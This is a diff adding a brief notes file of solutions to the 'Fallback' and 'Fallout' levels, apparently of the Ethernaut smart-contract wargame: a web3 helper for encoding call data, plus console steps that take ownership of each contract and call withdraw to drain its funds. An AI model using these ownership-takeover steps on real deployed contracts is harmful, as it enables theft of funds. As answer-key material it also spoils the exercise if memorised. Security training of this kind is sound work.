@@ -1,0 +1,24 @@
+// this function creates the data string necessary to get the function identifier which can then be used thusly:
+//web3.sendTransaction({to: instance, value: toWei(0.0001), data: functionData(contract,"contribute")})
+// in which contribute is the function name, and instance is the contract address
+
+function functionData(contract, functionName, parameters){ 
+    let abi = web3.eth.contract(contract.abi);
+    let w3Contract = abi.at(contract.address);
+    if (parameters != undefined){
+        return w3Contract[functionName].getData(...parameters);
+    } else {
+        return w3Contract[functionName].getData();
+    }
+}
+
+* Fallback
+
+sendTransaction({to: instance, value: toWei(0.0001), data: functionData(contract,"contribute")})
+sendTransaction({to: instance, value: toWei(0.0001)})
+contract.withdraw()
+
+
+* Fallout
+sendTransaction({to: instance, value: toWei(0.0001), data: functionData(contract,"Fal1out")})
+contract.withdraw()
